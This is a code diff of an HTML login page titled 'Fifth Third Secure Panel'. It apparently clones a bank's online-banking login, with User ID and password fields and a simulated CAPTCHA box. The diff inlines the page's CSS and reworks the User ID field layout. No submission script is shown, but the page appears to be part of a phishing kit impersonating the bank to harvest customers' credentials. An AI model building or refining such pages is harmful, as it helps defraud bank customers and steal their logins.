@@ -4,7 +4,212 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Fifth Third Secure Panel</title>
-  <link rel="stylesheet" href="/assets/style.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #2c5282 0%, #4a90e2 100%);
+    }
+    .header {
+      background-color: white;
+      padding: 15px 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .logo-img {
+      width: 40px;
+      height: 40px;
+      object-fit: contain;
+      border-radius: 4px;
+      background: #2e5aa0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .brand-text {
+      font-size: 24px;
+      font-weight: bold;
+      color: #2e5aa0;
+      letter-spacing: 1px;
+    }
+    .header-links {
+      display: flex;
+      gap: 15px;
+      font-size: 14px;
+      color: #666;
+    }
+    .breadcrumb {
+      background-color: white;
+      padding: 10px 30px;
+      font-size: 14px;
+      color: #666;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .breadcrumb a {
+      color: #4a90e2;
+      text-decoration: none;
+    }
+    .login-bg {
+      background: linear-gradient(135deg, #2c5282 0%, #4a90e2 100%);
+      min-height: 600px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 60px 20px;
+    }
+    .login-card {
+      background: white;
+      border-radius: 8px;
+      padding: 35px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+    }
+    .login-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 30px;
+      text-align: center;
+    }
+    .verify-form label {
+      display: block;
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #555;
+      font-weight: 500;
+    }
+    .user-id-container {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 8px;
+    }
+    .verify-form input, .verify-form select {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-top: 8px;
+    }
+    .verify-form input:focus, .verify-form select:focus {
+      outline: none;
+      border-color: #4a90e2;
+    }
+    .user-id-input {
+      flex: 1;
+      margin-top: 0;
+    }
+    .save-btn {
+      background-color: #e6e6e6;
+      border: 1px solid #ccc;
+      padding: 10px 20px;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+      color: #555;
+      margin-top: 0;
+    }
+    .save-btn:hover {
+      background-color: #d6d6d6;
+    }
+    .login-btn {
+      width: 100%;
+      background-color: #1a357a;
+      color: white;
+      padding: 15px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+      letter-spacing: 1px;
+    }
+    .login-btn:hover {
+      background-color: #2248b0;
+    }
+    .recaptcha-box {
+      margin: 10px 0 0 0;
+      text-align: left;
+    }
+    .recaptcha-error {
+      color: #d32f2f;
+      font-size: 0.95em;
+      display: block;
+      margin-bottom: 4px;
+    }
+    .recaptcha-sim {
+      width: 304px;
+      height: 78px;
+      background: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 4px;
+      display: inline-block;
+    }
+    .links {
+      margin-top: 20px;
+      text-align: left;
+    }
+    .links a {
+      color: #4a90e2;
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 8px;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    .info-section {
+      background-color: white;
+      padding: 60px 30px;
+      text-align: center;
+    }
+    .info-section h2 {
+      font-size: 28px;
+      color: #333;
+      margin-bottom: 20px;
+      font-weight: normal;
+    }
+    .info-section p {
+      font-size: 16px;
+      color: #666;
+      line-height: 1.6;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    @media (max-width: 600px) {
+      .header, .header-left, .header-links {
+        flex-direction: column;
+        align-items: flex-start;
+        margin: 0 8px;
+      }
+      .login-card {
+        max-width: 98vw;
+        padding: 8vw 2vw 8vw 2vw;
+      }
+      .recaptcha-sim {
+        width: 100%;
+        min-width: 180px;
+      }
+      .breadcrumb {
+        padding-left: 16px;
+      }
+    }
+  </style>
 </head>
 <body>
   <div class="header">
@@ -20,7 +225,7 @@
   </div>
   <div class="breadcrumb"><a href="#">Home</a> &gt; <b>Login</b></div>
   <div class="login-bg">
-    <div class="center-panel login-card">
+    <div class="login-card">
       <div class="login-title">Online Banking Login</div>
       <form class="verify-form" id="login-form">
         <label>Online Banking
@@ -28,9 +233,11 @@
             <option>Online Banking</option>
           </select>
         </label>
-        <label style="display: flex; align-items: center; gap: 8px;">User ID
-          <input type="text" name="userid" required style="flex:1;">
-          <button type="button" class="save-btn">Save</button>
+        <label>User ID
+          <div class="user-id-container">
+            <input type="text" name="userid" required class="user-id-input">
+            <button type="button" class="save-btn">Save</button>
+          </div>
         </label>
         <label>Password
           <input type="password" name="password" required>
